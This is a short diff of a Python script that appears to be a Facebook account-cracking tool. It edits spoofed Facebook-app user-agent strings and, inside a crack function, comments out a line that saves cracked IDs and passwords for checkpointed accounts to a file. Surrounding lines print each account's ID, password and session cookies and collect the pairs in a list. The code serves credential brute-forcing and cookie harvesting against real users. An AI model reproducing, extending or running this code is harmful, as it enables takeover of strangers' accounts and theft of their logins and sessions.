@@ -29,7 +29,7 @@ CON=sol()
 #------------------[ USER-AGENT ]-------------------#
 ua = ["[FBAN/FB4A;FBAV/323.0.0.46.119;FBBV/298672900;FBDM/{density=3.1,width=1080,height=1958};FBLC/ru_RU;FBRV/0;FBCR/YOTA;FBMF/LENOVO;FBBD/Lenovo;FBPN/com.facebook.katana;FBDV/Lenovo Z90a40;FBSV/6.0.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]",]
 ua = ["'FBAN/FB4A;FBAV/20.0.0.4133;FBBV/2391609;[FBAN/Orca-Android;FBAV/256.0.0.76.46;FBPN/com.facebook.orca;FBLC/en_US;FBBV/233042286;FBCR/AIS;FBMF/Xiaomi;FBBD/xiaomi;FBDV/M2101K7AG;FBSV/12;FBCA/arm64-v8a:null;FBDM/{density=2.75,width=1080,height=2130};FB_FW/1;]",]
-##ua = ["FBAN/FB4A;FBAV/15.0.0.912;FBBV/3800125;[FBAN/FB4A;FBAV/280.0.0.48.122;FBBV/233235247;FBDM/{density=3.0,width=1080,height=2132};FBLC/en_US;FBRV/235412020;FBCR/airtel;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/CPH1893;FBSV/9;FBOP/1;FBCA/armeabi-v7a:armeabi",]
+ua = ["FBAN/FB4A;FBAV/237.0.0.3.115;FBBV/4247879;[FBAN/FB4A;FBAV/435.0.0.42.112;FBBV/446013578;FBDM/{density=3.0,width=1080,height=2132};FBLC/en_US;FBRV/235412020;FBCR/airtel;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/CPH1893;FBSV/9;FBOP/1;FBCA/armeabi-v7a:armeabi;",]
 ##ua = 'Mozilla/5.0 (Linux; Android 7.1.1; SM-J510FN Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.96 Mobile Safari/537.36 GSA/11.2.9.21.arm'
 ##ua = 'Mozilla/5.0 (Linux; U; Android 9; en-gb; CPH1881 Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/15.5.1.10'
 ##ua = 'Mozilla/5.0 (Linux; Android 9; STK-LX1 Build/HUAWEISTK-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Mobile Safari/537.36 YaApp_Android/10.91 YaSearchBrowser/10.91'
@@ -490,7 +490,7 @@ def crack(idf,pwv):
 				#SHANTO-King
 				print(f'\r\033[0;94m[{time.strftime("%H:%M")}SHANTO-Cp] {idf}  {pw}\n\033[0;93 COOKIES \033[0;92m{kuki} ')     
 				os.system('espeak -a 300 " C,  P"')
-			    open('CP/'+cpc,'a').write(idf+' • '+pw+'\n')
+			    ##open('CP/'+cpc,'a').write(idf+' • '+pw+'\n')
 				akun.append(idf+'|'+pw)
 				cp+=1
 				break
